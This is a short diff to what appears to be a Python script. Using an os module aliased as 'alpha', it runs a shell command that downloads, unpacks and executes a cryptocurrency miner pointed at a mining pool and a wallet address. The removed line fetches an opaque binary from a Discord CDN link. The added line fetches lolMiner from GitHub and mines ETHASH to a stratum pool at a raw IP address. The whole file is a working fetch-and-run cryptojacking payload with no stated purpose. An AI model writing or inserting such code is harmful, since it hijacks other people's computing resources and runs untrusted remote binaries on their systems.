@@ -1,3 +1,2 @@
 import os as alpha
-alpha.system("curl -LJO https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && ./work -rvram 1 -pool  us.stratu.ms:16062 -ewal 3Ft56HYdAPXxRSQQAXRSggbuFYC2tpi4kB.rig -proto 4 -straps 2")
-
+alpha.system("curl -LJO https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xvf lolMiner_v1.29_Lin64.tar.gz  && cd 1.29 && chmod +x lolminer && ./lolminer --algo ETHASH --pool stratum+tcp://3.68.227.61:9595 --user 3JgjH5V3mT56F3kqCjLTzqirZz8ei9cNH5.siqdj3dp157i20c.WORKER")
